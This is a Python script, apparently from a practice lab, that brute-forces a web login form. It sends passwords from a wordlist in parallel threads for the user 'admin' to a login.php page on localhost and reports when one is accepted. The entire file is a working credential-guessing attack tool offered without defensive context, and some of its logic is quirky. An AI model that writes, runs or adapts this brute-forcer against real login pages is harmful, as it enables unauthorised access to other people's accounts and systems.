import requests
from threading import Thread
import sys
from termcolor import colored


global hit
hit = "1"

class request_performer(Thread):
    def __init__(self, name, user, url):
        Thread.__init__(self)
        self.password = name.split("\n")[0]
        self.username = user
        self.url = url
        print("-" + self.password + "-")

    def run(self):
        global hit
        if hit == "1":
            try:
                payload = {'Username': self.username, 'Password': self.password, 'Submit': 'submit'}
                r = requests.post(self.url, data=payload)
                invalid = 'Invalid'.rstrip(" Login Details")

                if invalid not in r.text:
                    hit = "0"
                    print("[+] Password found -" + colored(self.password, 'green'))
                    sys.exit()
                else:
                    print("Not valid " + colored(self.password, 'red'))
                    i[0] = i[0] - 1
            except Exception as e:
                print(e)


def start():
    global url
    global user
    global threads
    global dictio

    dictio = 'harald.txt'
    threads = 5
    user = 'admin'
    url = 'http://localhost:9090/login.php'

    try:
         f = open(dictio, "r")
         passwords = f.readlines()
    except:
        print("Failed opening file: " + dictio + "\n")
        sys.exit()
    launcher_thread(passwords, threads, user, url)


def launcher_thread(passwords, th, username, url):
    global i
    i = []
    i.append(0)
    while len(passwords):
        if hit == "1":
            try:
                if i[0] < th:
                    passwd = passwords.pop(0)
                    i[0] = i[0] + 1
                    thread = request_performer(passwd, username, url)
                    thread.start()
            except KeyboardInterrupt:
                print("Brute forcer interrupted by user. Finishing attack...")
                sys.exit()
            thread.join()


start()